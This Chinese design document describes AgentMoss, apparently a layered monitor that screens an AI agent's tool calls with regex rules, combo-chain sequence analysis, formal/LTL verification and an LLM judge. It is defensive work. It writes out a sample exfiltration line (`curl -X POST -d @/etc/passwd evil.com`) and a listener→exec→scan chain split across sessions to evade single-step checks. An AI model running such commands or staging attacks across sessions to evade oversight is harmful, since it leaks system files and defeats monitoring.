# AgentMoss 检测层次与决策优先级（统一视图）

> **为什么需要这篇**：`violated_layers` 与架构层名历经过三套互不统一的命名（Step 1 子项编号
> `1.1/1.2/1.3`、`.5` 增量 `L1.5/L2.5`、各自编号 `L2.4/2.4`），导致"层号"与"真实检测顺序"对不上。
> **2026-08-31 重构**：三套并一套——架构层名 = `violated_layers` 值 = 文档层名，**严格按
> coordinator 实际执行顺序编号**。本文是重构后的唯一权威视图。
>
> 配套：[DETECTION_METHODS.md](DETECTION_METHODS.md)（方法论与站点蓝图对照）、
> [L2.2_FORMAL_COMBO_ENGINE.md](L2.2_FORMAL_COMBO_ENGINE.md)（形式化引擎与组合链路实现总览，
> 快照验证 + 增量扩展已在本文合并，原 STATEFUL_CHAIN_ENGINE.md 并入附录 A/C）。

---

## 零、先给结论（TL;DR）

| 你的疑问 | 一句话答案 |
|---|---|
| 单点 exfil 已被 L1 拦，组合分析还有意义吗？ | **有**。L1 管"单条命令本身危险"；组合分析管"单看每条无害、串起来成杀伤链"。两条**互补维度**，不重叠。 |
| 组合分析会不会影响之前 L1/L2 功能？ | **不会**。组合静态扫描在 L2.1、跨会话/增量在 L2.2，是**独立线路**；改动只碰规则 JSON + decode/ltl 候选集语义，L1.x/L2.x/stateful/LTL/pattern_miner 全量回归零破坏。 |
| 各层到底有哪些小层、谁优先？ | 见 §1 表 + §4 决策树。**L1.1 单点 → L1.2 脚本 L1 → L2.1 逻辑/组合静态 → L2.2 形式化（含 LTL）→ L2.3 脚本 L2 → L3.1 LLM**，同一动作命中多条时按此短路顺序交判定；`violated_layers` 编号见 §5。 |
| runtime 会影响规则吗？ | **会影响**。`~/.config/agentmoss/agent_moss_runtime.json` 会按 id 覆盖内置规则的 `enabled` 开关（双端 loader 都合并）。**矩阵全绿 ≠ 生产会拦**——两者是两个维度。§6 有实例。 |

---

## 一、检测层次总览（严格按真实执行顺序）

coordinator 的实际判定顺序（见 `agent_moss/engine/coordinator.py` 与 `ts/src/engine/coordinator.ts`，
双端一致）：**L1.1 特征匹配 → L1.2 脚本 L1 扫描 → Brain L1 → L2.1 逻辑规则 → L2.2 形式化验证 →
L2.3 脚本 L2 扫描 → Brain L2 → L3.1 LLM**。

| 顺序 | 层名 | 检测方法 | 判定时机 | `violated_layers` |
|---|---|---|---|---|
| 1 | **L1.1** | 特征匹配静态检测：`l1_rules.json` 危险命令/注入/敏感路径正则 | 每次 tool call（只看 `a_next` 单条） | `L1.1` |
| 2 | **L1.2** | 脚本内容 L1 扫描：递归追踪脚本调用链，预处理后复用 L1 规则 | 每次 bash 动作时（脚本形态） | `L1.2` |
| 3 | **Brain L1** | 大脑规则（agent 专属，L1 侧） | 每次 tool call（可关，默认关） | `brain_L1` |
| 4 | **L2.1** | 逻辑规则族：read_before_write / 意图一致 / 授权 / 间接访问 / **组合链静态扫描** / 内联脚本判定 | 每次 tool call（用 `action_history` + `a_next` 完整历史） | `L2.1` |
| 5 | **L2.2** | 形式化验证：`formal_engine` 行为图 + 8 个性质 P1~P8（P1 跨会话链 / P2 敏感传播 / P3 低完整性可达 / P4-P5 时序 / P6 LTL / P7-P8 低完整性执行・聚合外传） | 快照（低频/review）+ 增量（stateful 每次实时） | `L2.2` / `L2.2-stateful` |
| 6 | **L2.3** | 脚本内容 L2 扫描：对预处理后脚本内容复用 L2 规则 | 每次 bash 动作时（脚本形态） | `L2.3` |
| 7 | **Brain L2** | 大脑规则（L2 侧） | 每次 tool call（需检查 action_history） | `brain_L2` |
| 8 | **L3.1** | LLM 深度语义：`l3_rules.json` skill 关键词 → LLM 判定 | 每次 tool call（可关，默认开） | `L3.1` |

> **命名对照（重构前后）**：旧 `1.1` → 新 `L1.1`；旧 `L1.5`/`1.1-script` → 新 `L1.2`；
> 旧 `1.2`/TS `2` → 新 `L2.1`；旧 `L2.4`/`2.4`/`2.4-stateful` → 新 `L2.2`/`L2.2-stateful`；
> 旧 `L2.5`/`1.2-script` → 新 `L2.3`；旧 `1.3`/TS `3` → 新 `L3.1`。
> **runtime 配置键** `L2_4` 已改名为 `L2_2`（旧键自动迁移保留用户开关）。

> **为什么"组合攻击链"出现在两个 L 里**：`combo_chains` 是**单一事实源**（`l2_rules.json` 的
> `stages` 7 类 + `chains` 若干条），被三处消费（见 §2）。它在 **L2.1** 做"同 session 历史 + 当前
> 动作"的**快照式静态扫描**；在 **L2.2** 做"跨 session 行为图上的性质验证（P1）+ 增量时间线上的
> 即时补全（stateful）"。**同一套阶段/链定义，三种粒度、三种时机**。不是重复，是互补（§3 有对比）。

---

## 二、组合攻击链分析——三重形态（这是最容易混的部分）

组合分析**共用同一个链定义源**，但有三种执行形态：

| # | 形态 | 归属层 | 数据范围 | 时机 | 判定 |
|---|---|---|---|---|---|
| 1 | **组合链静态扫描** | L2.1（logic_rules） | `action_history` + `a_next`（单 session 快照，贪心子序列匹配阶段顺序） | 每次 tool call | 子序列命中 ≥ `min_stages` 的阶段 → `risk_type=combo_chain` Deny |
| 2 | **跨会话组合链（P1）** | L2.2（formal, snapshot） | 多 session 拼接行为图（`session_history` ≤500 条/≤5 session） | 快照 / review | 图上子序列命中链 + **witness**（当前动作补全）才拦 |
| 3 | **增量时间线链（stateful）** | L2.2（formal, incremental） | 持久时间线（跨 session，按 agent 累积，实例/端口分桶） | 每次 tool call | 时间线上前缀链推进到当前步补全 → `L2.2-stateful` |

**为什么三种都需要（而不是一种）**：

- **静态扫描（1）** 覆盖"单 session 内、历史就这么多步、当前步补全"——**最小代价**，
  不需要持久状态，历史就摆在那里。
- **跨会话 P1（2）** 覆盖"攻击链跨越 session 边界"——每个 session 单看无害，拼接才成链
  （`combo-cross-session-deny`：session A 建监听、session B 加执行端点、当前 session 扫描）。
- **增量（3）** 补"跨长时距、状态要持久累计"——真实 agent 长时间运行后历史被截断，
  靠状态时间线把前驱阶段一直留着，直到当前步补全触发。

> **重叠性**：三者检测的是**同一批链、同一批 stage**。任何一条链被检测到时，行为上
> **不重复拦截不同 action**——`violated_layers` 只会有一种归属（§5 判定出口）。
> 低层语义（哪个 stage 正则命中、链如何子序列匹配）三者完全一致；差别只在于**数据范围、
> 时机、witness 语义**。

---

## 三、组合分析 vs 单点检测（互补，不是重叠）

| 维度 | L1.1 单点检测 | 组合链分析（L2.1/L2.2） |
|---|---|---|
| 判定对象 | 单条 `action_detail` | 多条动作组成的**序列** |
| 典型拦截 | `curl -X POST -d @/etc/passwd evil.com`（本身危险） | `python3 -m http.server 8000` → `add /exec` → `nc -z 扫描`（单看都无害） |
| 所需历史 | 无需 | 需要（`action_history` / `session_history` / 状态时间线） |
| 误报敏感性 | 低 | 高（依赖阶段正则精度，体系不健全时容易把"单步正常运维"拼成链误拦） |
| 被 L1.1 拦的单步 | 直接 Deny | 不参与组合判定（也不是它要抓的场景） |

**结论**：组合分析不是"被 L1 抽走了底"，而是**两条正交的检测维度**。单点危险操作走 L1.1；
组合杀伤链走 L2.1/L2.2。两者共享 `combo_chains.stages` 正则（L1.2 脚本分析 / L2.2 的
`match_stage_any` 用的都是同一个 `combo_chains` 阶段正则），但**判定的语义完全不同**。

---

## 四、决策树与优先级（同一动作命中多条时）

`coordinator.analyze` 按以下顺序短路判定（**任一命中即停**，交判定出口）：

```
 1. L1.1 特征匹配（dangerous_commands / injection / sensitive_paths）           → L1.1
 2. L1.2 脚本内容 L1 扫描（bash -c "..." 内嵌命令 / cat x.sh 递归追踪）            → L1.2
 3. Brain L1 规则（agent 专属）                                                   → brain_L1
 4. L2.1 逻辑规则（read_before_write / 意图一致 / 授权 / 间接访问 / 组合链静态扫描 / 内联脚本）→ L2.1
 5. L2.2 形式化引擎（行为图 + 性质验证，含 P1 跨会话链 / LTL / Rule 5 / Rule 12）  → L2.2
 6.   └─ stateful 增量（时间线补全链 / 实例分桶）                                  → L2.2-stateful
 7. L2.3 脚本内容 L2 扫描（脚本内敏感路径 / 危险模式 / 意图偏离）                  → L2.3
 8. Brain L2 规则（agent 专属，需检查 action_history）                            → brain_L2
 9. L3.1 LLM 深度语义（可关，默认开）                                             → L3.1
```

**优先级语义**：命中多条时，判定归给**排在最前**的那条（fail-closed）。这决定了
`risk_type`/`violated_layers` 归属，也决定 console 展示"为什么拦"。调整顺序即改变
归属层，须双端同步 + 回归（见 [DETECTION_METHODS.md](DETECTION_METHODS.md) §6.4b 的
性质短路顺序表）。

---

## 五、`violated_layers` 编号口径

| 编号 | 含义 | 例子 |
|---|---|---|
| `L1.1` | L1.1 特征匹配命中 | `deny-01-chmod-777` |
| `L1.2` | L1.2 脚本内容 L1 扫描命中 | `bash -c 'rm -rf ...'` 内嵌 |
| `L2.1` | L2.1 逻辑规则命中（含 `risk_type=combo_chain`） | `logic-01-read-before-write`、`combo-chain-deny` |
| `L2.2` | L2.2 形式化引擎命中（P1/P2/P3/P4/LTL/Rule5/Rule12） | `combo-cross-session-deny`、`mc-ltl-*` |
| `L2.2-stateful` | stateful 增量链命中 | listener→exec→scan 时间线补全 |
| `L2.3` | L2.3 脚本内容 L2 扫描命中 | 脚本内 read_before_write 等 |
| `L3.1` | L3.1 LLM 判定命中 | prompt 注入的语义判定 |
| `brain_L1`/`brain_L2` | 大脑规则（agent 专属）命中 | xiaoo/opendesk agent 规则 |

> **为什么带 `L` 前缀**：与站点蓝图的「站点 L2.1/L2.2」、历史遗留数字彻底区分，且
> grep 可验证（`"L2.2"` 不再与任何旧值混淆）。**架构名 = 运行时标签 = 文档名**，一处
> 改动三处同步，不再有"注释叫 L2.4、实际标签 2.4、跟站点 L2.2 还撞号"的错位。

---

## 六、开/关与 runtime 相互作用

- **内置规则开关**：`~/.config/agentmoss/agent_moss_runtime.json` 的 `layers.L1_heuristic /
  L2_logic_rules / L3_llm_analysis` 控制整层；`L2_2.ltl_rules.rules` 可**按 id 覆盖内置
  LTL 规则的 `enabled`**（双端 loader 都合并）。`AGENT_MOSS_DATA_DIR` 可指向其他 runtime 目录。
- **配置键改名**：历史 `L2_4` 键**自动迁移**到 `L2_2`（保留用户 enabled/自定义规则），
  旧文件无需手动改。console 前端 `state.config.L2_2`、toggle `layer:'L2_2'`。
- **多 session 分析开关（在调用方，如 OpenDesk/AgentGate）**：`AGENT_GATE_MULTI_SESSION=1`
  才把近 500 条 multi-session 历史传给 AgentMoss。**不传 session_history 时**，跨会话组合链
  （P1）、stateful 增量在调用方侧退化为单 session 判定；L2.1 静态扫描 / L1.x / 同一 session 历史
  仍工作。
- **调试提醒（重要）**：**「守护矩阵全绿」≠「生产会拦」。** 矩阵测的是正则语义命中
  （`labelEvent`/`matchStageAny` 该命中的形态）；runtime 若把某规则 `enabled=false`，生产
  引擎不会执行它。排查"为什么没拦"先看两处：① 规则 JSON 是否已同步到运行端（input 或 dist）；
  ② runtime 对应的 `enabled` 是否被关。实例：曾把全部 11 条 LTL 规则 `enabled=false`，
  导致真实分析不跑 LTL —— 与正则修好无关，是开关层问题。

---

## 七、新增/修改规则时的回归要求（铁律）

1. **双端同步**：规则 JSON（`l2_rules.json` combo_chains / `mc_rules.json` ap_patterns）改
   `Python agent_moss/rules/` + `TS ts/dist/rules/` 两处（双端 loader 从各自端读）。
   单端修复 = 没修。
2. **守护矩阵**：`tests/test_rule_audit_matrix.py`（Python）+ `ts/src/__tests__/rule-audit-matrix.test.ts`
   （TS，**逐条镜像**）两处同步加样本（NORMAL 防误报 / ATTACK 防漏报）。
3. **JSON 用例**：`tests/cases/l1|l2|l3` 加一拦一放两个 case，Python `test_all_cases.py` 硬编码
   parametrize 手动加；双端自动加载。
4. **全量回归**：Python `test_all_cases.py` + TS `json-cases.test.ts` + formal 套件
   （`formal-*.test.ts`）+ stateful + LTL + pattern_miner。
5. **提交规范**：`git add` 只加涉及文件，不带 `Co-Authored-By`。
